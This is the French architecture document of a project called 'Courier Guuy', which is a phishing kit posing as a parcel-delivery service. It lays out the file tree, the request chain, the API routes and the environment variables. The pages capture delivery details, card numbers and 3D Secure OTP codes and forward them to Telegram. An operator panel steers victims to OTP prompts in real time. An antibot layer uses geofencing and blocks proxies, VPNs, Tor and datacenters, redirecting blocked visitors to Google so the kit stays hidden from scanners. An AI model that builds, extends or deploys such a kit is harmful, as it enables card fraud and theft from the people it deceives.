# Architecture complète — Courier Guuy

## 1. Arborescence du projet

```
courier-guuy/
├── client/                          # Frontend React (Vite, root = client/)
│   ├── public/
│   │   └── .htaccess                # Réécriture SPA pour Apache (dist/public)
│   └── src/
│       ├── App.tsx                  # Router (wouter), QueryClient, VisitIdProvider
│       ├── main.tsx
│       ├── index.css
│       ├── components/
│       │   ├── Footer.tsx
│       │   ├── Navbar.tsx
│       │   ├── VisitIdProvider.tsx
│       │   └── ui/                  # Radix + shadcn (accordion, alert, button, card, …)
│       ├── hooks/
│       │   ├── use-mobile.tsx
│       │   ├── use-toast.ts
│       │   └── use-visit-id.ts
│       ├── lib/
│       │   ├── antibot-client.ts     # Interception fetch, fingerprint, JS challenge, behavior
│       │   ├── api-base.ts           # getApiBase(), apiUrl() — VITE_API_ORIGIN
│       │   ├── fetch-with-visit-id.ts
│       │   ├── honeypot.ts           # Champs honeypot dans formulaires
│       │   ├── iso-numeric-to-alpha2.ts  # Map world-atlas → codes pays (Map attack)
│       │   ├── queryClient.ts
│       │   ├── utils.ts
│       │   └── visit-id.ts           # Génération / persistance visitId
│       ├── pages/
│       │   ├── home.tsx              # Formulaire livraison → Telegram
│       │   ├── processing.tsx
│       │   ├── payment.tsx          # Formulaire carte → BIN + Telegram
│       │   ├── payment-verification.tsx
│       │   ├── vbv.tsx               # 3D Secure (OTP) → Telegram
│       │   ├── vbv-app.tsx           # Variante app 3DS
│       │   ├── vbv-panel.tsx         # Panel opérateur (clients, redirection)
│       │   ├── success.tsx
│       │   ├── security-check.tsx    # Portail géo → /home
│       │   ├── ozyadmin.tsx          # Panel admin (dashboard, config, logs)
│       │   └── not-found.tsx
│       └── react-simple-maps.d.ts
│
├── server/
│   ├── index.ts                     # Point d’entrée : Express, middlewares, registerRoutes, Vite ou static
│   ├── routes.ts                    # Toutes les routes API (geo-gate, flows, bin, captcha, payment, vbv-panel, ozyadmin, admin)
│   ├── static.ts                    # Servir dist/public en prod (fallback index.html SPA)
│   ├── vite.ts                      # Dev : Vite middleware + fallback index.html
│   ├── storage.ts                   # MemStorage (users) — schéma shared, non utilisé par les flows actuels
│   ├── middleware/
│   │   ├── antibot-middleware.ts    # Whitelist, blacklist, géo, config antibot, UA, headers, proxy/Tor/VPN, datacenter, log botfuck
│   │   ├── cors.ts                  # FRONTEND_ORIGIN → Access-Control-Allow-Origin
│   │   ├── datacenter-blocker.ts    # (optionnel) Blocage datacenter
│   │   ├── rate-limit.ts            # Limite par IP
│   │   └── security-headers.ts      # Headers de sécurité (CSP, etc.)
│   ├── services/
│   │   ├── antibot-config-service.ts  # Lecture/écriture antibot-config.json
│   │   ├── bin-checker.ts             # API bincodes.com (BIN → banque, carte, pays)
│   │   ├── flow-service.ts           # Suivi des étapes de flow (payment, vbv, success)
│   │   ├── geo-filter-service.ts     # Lecture/écriture allowed-countries.json
│   │   ├── session-service.ts        # Sessions OzyAdmin (cookie + X-Session-Id)
│   │   ├── vbv-panel-service.ts      # Clients en attente, redirections OTP
│   │   └── weight-service.ts         # Poids colis (types/weight.ts)
│   ├── secure/
│   │   ├── index.ts                  # Répertoires randomisés (createRandomDir, etc.) — placeholder
│   │   ├── README.md                 # Doc architecture secure/
│   │   ├── app/
│   │   │   └── send.ts               # buildTelegramMessage, buildTelegramMessage3DS, sendToTelegram, sendCustomMessage
│   │   ├── config/
│   │   │   └── config.ts             # loadConfig(): Telegram, hCaptcha, binChecker, allowedCountries, sessionSecret
│   │   └── panel/
│   │       ├── security-modules.ts   # Réexport hcaptcha, proof-of-work, mouse-dynamics, webgl-fingerprint, behavior-analysis, js-challenge, honeypot
│   │       ├── ip-manager.ts         # getRealIp, whitelist/blacklist (fichiers racine), loadIPLists
│   │       ├── geo-filter.ts         # getGeoLocation (API + geoip-lite), checkGeoAllowed
│   │       ├── botfuck-logger.ts      # botfuck.txt, parseLogLine, getBotLogsWithStats
│   │       ├── bot-detection.ts      # Détection bots (hub)
│   │       ├── rate-limiter.ts       # Rate limit par clé (IP, etc.)
│   │       ├── honeypot.ts           # Génération / vérification honeypot
│   │       ├── hcaptcha.ts           # getSiteKey, verifyHCaptcha
│   │       ├── proxy-detection.ts    # Détection proxy / VPN / Tor
│   │       ├── datacenter-detection.ts # isDatacenterIP (API + listes ASN)
│   │       ├── proof-of-work.ts      # Défi / vérification PoW
│   │       ├── js-challenge.ts       # Génération / vérification défi JS
│   │       ├── behavior-analysis.ts  # Analyse comportement
│   │       ├── mouse-dynamics.ts     # Analyse souris
│   │       ├── webgl-fingerprint.ts  # Fingerprint WebGL
│   │       ├── visitor-manager.ts   # ID visiteur (hash IP + UA)
│   │       └── (fichiers listés dans secure/README)
│   ├── utils/
│   │   └── panel-link.ts             # getBaseUrl (FRONTEND_ORIGIN), buildPanelLink, extractVisitId
│   └── types/
│       ├── flow.ts                   # Types flow (FlowEventRequest, etc.)
│       ├── weight.ts                 # Types poids
│       └── geoip-lite.d.ts           # Déclarations geoip-lite
│
├── shared/
│   └── schema.ts                    # Drizzle : users (id, username, password) — utilisé par storage.ts
│
├── script/
│   └── build.ts                     # rm dist, vite build (client → dist/public), esbuild (server → dist/index.cjs)
│
├── data/                             # Doc seulement (fichiers réels à la racine)
│   └── README.md                    # whitelist.txt, blacklist.txt, botfuck.txt
│
├── allowed-countries.json           # Pays autorisés (géofiltre) — écrit par OzyAdmin
├── antibot-config.json              # Config antibot (activations, blocages) — écrit par OzyAdmin
├── whitelist.txt                    # IP whitelist (créé par ip-manager si absent)
├── blacklist.txt                    # IP blacklist (idem)
├── botfuck.txt                      # Logs antibot (créé par botfuck-logger si absent)
│
├── env.example                      # Variables d’environnement documentées
├── package.json
├── package-lock.json
├── tsconfig.json
├── vite.config.ts                   # root: client, build.outDir: dist/public
├── postcss.config.js
├── drizzle.config.ts                # Drizzle Kit (schema shared, PostgreSQL)
├── vite-plugin-meta-images.ts       # Meta og:image / twitter:image (Replit)
├── components.json                  # shadcn/ui
├── render.yaml                      # Déploiement Render (buildCommand, startCommand, envVars)
├── deploy.sh                        # Script déploiement
├── install-apache.sh                # Config Apache (mod_rewrite, etc.)
├── install-complete.sh              # Installation complète
├── ecosystem.config.example.js      # PM2 (exemple)
└── ARCHITECTURE.md                  # Ce fichier
```

---

## 2. Chaîne de traitement des requêtes (serveur)

```
Requête HTTP
    → express.json() + express.urlencoded()
    → securityHeadersMiddleware
    → corsMiddleware (FRONTEND_ORIGIN)
    → antibotMiddleware
          ├── Skip: /api/ozyadmin, /api/admin, /api/captcha, /api/vbv-panel
          ├── Whitelist IP → next()
          ├── Blacklist IP → logBotActivity + redirect Google
          ├── Géofiltre (allowed-countries) → si refusé: logBotActivity + addToBlacklist + redirect Google
          ├── Config antibot (enabled, user_agent, header, proxy, vpn, tor, datacenter, …) → score, blocage ou next()
          └── logBotActivity si blocage
    → registerRoutes() : routes API (voir section 3)
    → (dev) Vite middleware ou (prod) serveStatic + fallback index.html
    → Error middleware (500 JSON)
```

---

## 3. Routes API (résumé)

| Préfixe / route | Rôle |
|------------------|------|
| GET /api/geo-gate | Portail géo (200 si OK après antibot) |
| POST /api/flows/event | Enregistrement étape flow |
| GET /api/parcel-weight | Poids colis (weight-service) |
| GET /api/bin/check?bin= | Vérification BIN (bin-checker) |
| GET/POST /api/captcha/* | hCaptcha (site-key, verify) |
| POST /api/telegram/send | Envoi message Telegram (custom ou structuré title+fields) |
| POST /api/payment/submit | Soumission paiement → BIN, Telegram, flow, vbvPanelService |
| POST /api/vbv-panel/register | Enregistrement client (visitId, page, …) |
| POST /api/vbv-panel/heartbeat | Heartbeat client |
| GET /api/vbv-panel/clients | Liste clients (panel opérateur) |
| POST /api/vbv-panel/redirect | Demande redirection OTP |
| POST /api/vbv-panel/leave | Déconnexion client |
| GET /api/vbv-panel/redirect-status | Statut redirection pour un visitId |
| GET/POST /api/ozyadmin/* | Auth (check, login, logout), dashboard, telegram, geo, antibot, iplists, analyze, logs |
| POST/GET /api/admin/reset-rate-limit, rate-limit-status | Admin rate limit (dev) |

---

## 4. Fichiers de données (racine)

- **allowed-countries.json** : pays autorisés (géofiltre), géré par `geo-filter-service` + OzyAdmin.
- **antibot-config.json** : options antibot (activation, UA, headers, proxy, VPN, Tor, datacenter, etc.), géré par `antibot-config-service` + OzyAdmin.
- **whitelist.txt** / **blacklist.txt** : IP autorisées / bloquées, gérées par `ip-manager` (lecture/écriture à la racine).
- **botfuck.txt** : logs des événements antibot (format documenté dans `data/README.md`), géré par `botfuck-logger`.

---

## 5. Build et déploiement

- **Build** : `npm run build` → `script/build.ts` (Vite → `dist/public/`, esbuild → `dist/index.cjs`).
- **Build front seul (VPS)** : `npm run build:static` → même chose avec `VITE_API_ORIGIN=https://courier-guuy.onrender.com` (ou variable).
- **Prod** : `npm start` → `node dist/index.cjs` (Express sert `dist/public/` + API).
- **Render** : `render.yaml` définit buildCommand (install + build) et startCommand (npm start).

---

## 6. Variables d’environnement (principales)

| Variable | Usage |
|----------|--------|
| PORT | Port serveur (défaut 3000) |
| NODE_ENV | development / production |
| ADMIN_PASSWORD | Mot de passe OzyAdmin (défaut music2018) |
| SESSION_SECRET | Secret session (prod) |
| TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID | Envoi Telegram |
| FRONTEND_ORIGIN | CORS + base URL lien VBV panel (ex. https://thcourierguuy.info) |
| VITE_API_ORIGIN | URL API au build (front déployé ailleurs) |
| BINCODES_API_KEY | Clé API BIN (bincodes.com) |
| HCAPTCHA_SITE_KEY, HCAPTCHA_SECRET_KEY | hCaptcha (optionnel) |
| DATABASE_URL | PostgreSQL (Drizzle) — optionnel pour flows actuels |

---

## 7. Fonctionnalités par couche

- **Client** : SPA (wouter), visitId, honeypot, antibot-client (fingerprint, JS challenge, behavior), appels API via `apiUrl()` (VITE_API_ORIGIN), formulaires livraison / paiement / 3DS, panels vbv-panel et ozyadmin.
- **Serveur** : Géofiltre, whitelist/blacklist, antibot (UA, headers, proxy/VPN/Tor, datacenter), logs botfuck, BIN, Telegram, flows, VBV panel (clients + redirections), OzyAdmin (auth session, config, logs, carte attaques), rate limit, CORS, sécurité headers.
- **Données** : Fichiers JSON/TXT à la racine (pays, config antibot, IP, logs); schéma Drizzle (users) et MemStorage présents mais non utilisés par le flux principal.

Ce document décrit l’architecture complète du projet telle qu’implémentée (fichiers, flux requêtes, routes, données, build et env).
